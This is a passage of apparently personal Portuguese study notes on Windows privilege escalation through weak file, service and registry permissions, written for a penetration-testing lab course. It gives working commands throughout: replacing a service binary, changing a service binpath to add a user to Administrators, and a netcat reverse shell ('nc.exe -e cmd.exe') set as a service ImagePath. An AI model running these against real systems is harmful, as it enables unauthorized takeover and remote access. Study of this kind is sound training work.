> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/windows-privilege-escalation/weak-permissions.md).

# Weak Permissions

As permissões em sistemas Windows são complexas e difíceis de configurar corretamente. Uma pequena modificação em um local pode introduzir uma vulnerabilidade em outro.

* **Executando o SharpUp**
* Podemos usar [o SharpUp,](https://github.com/GhostPack/SharpUp/) do pacote de ferramentas GhostPack, para verificar se há binários de serviço com ACLs fracas.

```ps
.\SharpUp.exe audit
```

* **Verificando permissões com icacls**

```ps
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

* Este serviço também pode ser iniciado por usuários sem privilégios, então podemos fazer um backup do binário original e substituí-lo por um binário malicioso gerado com  `msfvenom`.

```ps
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

**Permissões de serviço fracas**

* Vamos verificar `SharpUp`novamente a saída em busca de serviços modificáveis. Vemos que o serviço `WindscribeService`em questão pode estar mal configurado

```
SharpUp.exe audit
```

* Em seguida, usaremos [o AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) do pacote Sysinternals para enumerar as permissões do serviço

```ps
accesschk.exe /accepteula -quvcw WindscribeService
```

&#x20;[SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sobre um  serviço,  significa controle total de leitura/gravação sobre ele.

* Verificar o grupo de administradores para confirmar se o nosso usuário atual é membro.

```ps
net localgroup administrators
```

**Alterar o caminho binário do serviço**

* Podemos usar nossas permissões para alterar o caminho do binário de forma maliciosa. Vamos alterá-lo para adicionar nosso usuário ao grupo de administradores locais

```ps
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

**Stopping Service**

* Em seguida, precisamos parar o serviço para que o novo `binpath`comando seja executado na próxima vez que ele for iniciado.

```ps
sc stop WindscribeService
```

**Starting the Service**

* Como temos controle total sobre o serviço, podemos iniciá-lo novamente, e o comando que inserimos no `binpath`arquivo será executado mesmo que uma mensagem de erro seja retornada

```ps
sc start WindscribeService
```

* Por fim, verifique se o nosso usuário foi adicionado ao grupo de administradores locais.

```ps
net localgroup administrators
```

**Weak Service Permissions - Cleanup**

* Podemos limpar tudo depois e garantir que o serviço esteja funcionando corretamente, interrompendo-o e redefinindo o caminho binário para o executável original do serviço

```ps
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

* Se tudo correr conforme o planejado, poderemos retomar o serviço sem problemas.

```ps
sc start WindScribeService
```

* **Verificando se o serviço está em execução.**

```ps
sc query WindScribeService
```

**Unquoted Service Path**

* **Searching for Unquoted Service Paths**

```ps
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

* Também vale a pena procurar por ACLs de serviço fracas no Registro do Windows

```ps
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

* Podemos abusar disso usando o cmdlet do PowerShell `Set-ItemProperty`para alterar o `ImagePath`valor, usando um comando como:

```ps
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

* Podemos usar o WMIC para ver quais programas são executados na inicialização do sistema

```ps
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

* Esta [postagem](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html) e [este site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2) detalham vários locais potenciais de execução automática em sistemas Windows.
